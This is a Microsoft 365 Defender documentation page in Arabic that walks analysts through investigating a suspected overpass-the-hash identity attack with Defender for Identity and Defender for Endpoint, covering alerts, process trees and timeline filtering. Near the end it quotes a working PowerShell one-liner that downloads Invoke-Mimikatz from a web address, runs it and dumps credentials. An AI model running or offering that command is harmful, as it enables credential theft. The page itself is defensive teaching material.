---
title: مثال عن هجوم مستند إلى الهوية
description: خطوة عبر مثال لتحليل هجوم مستند إلى الهوية.
keywords: الأحداث، التنبيهات، التحقق، الارتباط، الهجوم، الأجهزة، الأجهزة، المستخدمون، الهويات، الهوية، علبة البريد، البريد الإلكتروني، 365، microsoft، m365، الاستجابة للحوادث، هجوم عبر الإنترنت
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 883c0480b5f8cb35abfe59458d35c8d1274b8493
ms.sourcegitcommit: bdd6ffc6ebe4e6cb212ab22793d9513dae6d798c
ms.translationtype: MT
ms.contentlocale: ar-SA
ms.lasthandoff: 03/08/2022
ms.locfileid: "63573915"
---
# <a name="example-of-an-identity-based-attack"></a>مثال عن هجوم مستند إلى الهوية

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**ينطبق على:**
- Microsoft 365 Defender

يمكن أن يساعد Microsoft Defender for Identity في الكشف عن المحاولات الضارة التي تؤذي الهويات في مؤسستك. نظرا لأن Defender for Identity يتكامل مع Microsoft 365 Defender، يمكن لمحللين الأمان رؤية التهديدات القادمة من Defender for Identity، مثل محاولات رفع امتياز Netlogon المشتبه بها.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>تحليل الهجوم في Microsoft Defender for Identity

Microsoft 365 Defender للمحللين بتصفية التنبيهات حسب مصدر الكشف على علامة **التبويب** تنبيهات في صفحة الأحداث. في المثال التالي، تمت تصفية مصدر الكشف إلى **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="مثال لتصفية مصدر الكشف ل Defender for Identity.":::

عند **تحديد تنبيه هجوم** تجاوز الهاشش المشتبه به، يتم الوصول إلى صفحة في Microsoft Defender for Cloud Apps تعرض معلومات أكثر تفصيلا. يمكنك دائما معرفة المزيد حول تنبيه أو هجوم عن طريق تحديد معرفة المزيد حول  نوع التنبيه هذا لقراءة وصف للهجوم بالإضافة إلى اقتراحات [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) المعالجة.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="مثال على تنبيه هجوم تجاوز الهاشش المشتبه به."::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>التحقق من الهجوم نفسه في Microsoft Defender لنقطة النهاية

بدلا من ذلك، يمكن للمحلل استخدام Defender for Endpoint لمعرفة المزيد حول النشاط على نقطة نهاية. حدد الحادث من قائمة انتظار الحادث، ثم حدد **علامة التبويب** تنبيهات. ومن هنا، يمكنهم تحديد مصدر الكشف أيضا. إن مصدر الكشف المسمى الكشف التلقائي والاستجابة على النقط النهائية هو "كشف نقطة النهاية والاستجابة لها"، وهو Defender لنقطة النهاية. من هنا، حدد المحلل تنبيها تم اكتشافه بواسطة الكشف التلقائي والاستجابة على النقط النهائية.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="مثال للكشف عن نقطة النهاية والاستجابة لها في Defender لنقطة النهاية."::: 

تعرض صفحة التنبيه معلومات مختلفة ذات صلة مثل اسم الجهاز الذي تم التأثير عليه واسم المستخدم حالة التحقيق التلقائي وتفاصيل التنبيه. تصف قصة التنبيه تمثيلا مرئيا شجرة العملية. إن شجرة العمليات هي تمثيل هيكلي للعمليات الأصل والطفل المرتبطة بالتنبيه.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="مثال على شجرة عملية تنبيه في Defender لنقطة النهاية."::: 

يمكن توسيع كل عملية لعرض تفاصيل إضافية. التفاصيل التي يمكن للمحلل رؤياها هي الأوامر الفعلية التي تم إدخالها كجزء من برنامج نصي ضار وعناوين IP للاتصال الصادر ومعلومات مفيدة أخرى.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="مثال حول تفاصيل العملية في Defender for Endpoint.":::
 
من خلال تحديد **رؤية في المخطط الزمني**، يمكن للمحلل التنقل لأسفل لتحديد الوقت المحدد للخطر. 

يمكن ل Microsoft Defender ل Endpoint الكشف عن العديد من الملفات والبرامج النصية الضارة. ومع ذلك، نظرا للعديد من الاستخدامات المشروعة للاتصالات الصادرة و PowerShell ونشاط سطر الأوامر، قد يعتبر بعض النشاط نشاطا غير جيد حتى ينشئ ملفا أو نشاطا ضارا. وبالتالي، فإن استخدام المخطط الزمني يساعد المحللين على وضع التنبيه في سياق مع النشاط المحيط لتحديد المصدر الأصلي للهجوم أو وقته الذي يحجبه نظام الملفات المشترك ونشاط المستخدم. 

للقيام بذلك، سيبدأ المحلل في وقت الكشف عن التنبيهات (باللون الأحمر) ويمرر لأسفل إلى الخلف في الوقت المناسب لتحديد وقت بدء النشاط الأصلي الذي أدى إلى النشاط الضار فعليا. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="مثال للبدء في وقت الكشف عن التنبيهات."::: 

من المهم فهم النشاط الشائع وتمييزه مثل اتصالات Windows Update و Windows حركة تنشيط البرامج الموثوق بها والاتصالات الشائعة الأخرى بمواقع Microsoft ونشاط الإنترنت من جهة خارجية ونشاط Microsoft Endpoint Configuration Manager والنشاط غير ذلك من الأنشطة غير الموثوق بها من الأنشطة المريبة. إحدى الطرق لتنفيذ ذلك هي باستخدام عوامل تصفية المخطط الزمني. هناك العديد من عوامل التصفية التي يمكنها تمييز نشاط معين أثناء تصفية أي شيء لا يريد المحلل عرضه. 

في الصورة أدناه، تمت تصفية المحلل لعرض أحداث الشبكة وا العملية فقط. يسمح هذا للمحلل برؤية اتصالات الشبكة والعمليات المحيطة بالحدث حيث المفكرة اتصالا باستخدام عنوان IP، وقد رأيناه أيضا في شجرة العمليات. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="مثال حول المفكرة المستخدمين في إجراء اتصال ضار من الخارج."::: 

في هذا الحدث تحديدا، المفكرة المستخدمين في إجراء اتصال ضار بالداخل. ومع ذلك، غالبا ما يستخدم المتطفلون iexplorer.exe لإنشاء اتصالات لتنزيل تحميل ضار لأن عمليات iexplorer.exe تعتبر عادة نشاط مستعرض ويب عاديا.

هناك عنصر آخر يجب البحث عنه في المخطط الزمني وهو استخدام PowerShell للاتصالات الصادرة. سيبحث المحلل عن اتصالات PowerShell `IEX (New-Object Net.Webclient)` ناجحة بأوامر مثل متبوع باتصال وارد لموقع ويب يستضيف ملفا ضارا. 

في المثال التالي، تم استخدام PowerShell لتنزيل Mimikatz وتنفيذه من موقع ويب:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
يمكن للمحلل البحث بسرعة عن الكلمات الأساسية عن طريق كتابة الكلمة الأساسية في شريط البحث لعرض الأحداث التي تم إنشاؤها باستخدام PowerShell فقط. 

## <a name="next-step"></a>الخطوة التالية

راجع [مسار التحقيق في التصيد](first-incident-path-phishing.md) الاحتيالي.

## <a name="see-also"></a>راجع أيضًا

- [نظرة عامة حول الأحداث](incidents-overview.md)
- [إدارة الأحداث](manage-incidents.md)
- [التحقيق في الأحداث](investigate-incidents.md)
